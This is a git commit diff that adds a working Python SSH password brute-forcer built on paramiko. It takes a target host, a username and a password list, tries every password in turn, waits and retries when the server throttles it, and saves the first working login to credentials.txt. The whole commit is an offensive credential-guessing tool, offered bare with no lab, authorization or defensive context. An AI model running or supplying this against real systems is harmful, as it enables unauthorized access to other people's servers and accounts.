289556c75fb12ab24650a14747ff1f2d60a9ac40
Joseph <joseph.hansjpedronan@gmail.com>
2026-09-07 19:54:40 -0700

    ssh_brute

--- ssh_brute/ssh_brute.py
+++ ssh_brute/ssh_brute.py
@@ -1,7 +1,7 @@
 import paramiko
 import socket
 import time
-
+import argparse
 from colorama import init, Fore
 
 init()
@@ -14,4 +14,34 @@ RED = Fore.RED
 def is_ssh_open(hostname, username, password):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
+    try:
+        client.connect(hostname=hostname, username=username, password=password)
+    except socket.timeout:
+        print(f"{RED}[-] Host: {hostname} is unreachable. Time out.{RESET}")
+        return False
+    except paramiko.AuthenticationException:
+        print(f"[-] Invalid credentials fro {username}:{password}")
+    except paramiko.SSHException:
+        print(f"{BLUE} [*] Retrying with delay...{RESET}")
+        time.sleep(60)
+        return is_ssh_open(hostname, username, password)
+    else:
+        print(f"{GREEN} Found combo: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+        return True
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='SSH Brutforce.')
+    parser.add_argument('host', help='Hostname or IP address of SSH Server.')
+    parser.add_argument('-P', '--passlist', help='Passwords file for brute force.')
+    parser.add_argument('-u', '--user', help='Host usesrname.')
+
+    args = parser.parse_args()
+    host = args.host
+    passlist = args.passlist
+    user = args.user
+
+    passlist = open(passlist).read().splitlines()
+    for password in passlist:
+        if is_ssh_open(host, user, password):
+            open("credentials.txt", 'w').write(f'{user}@{host}:{password}')
+            break
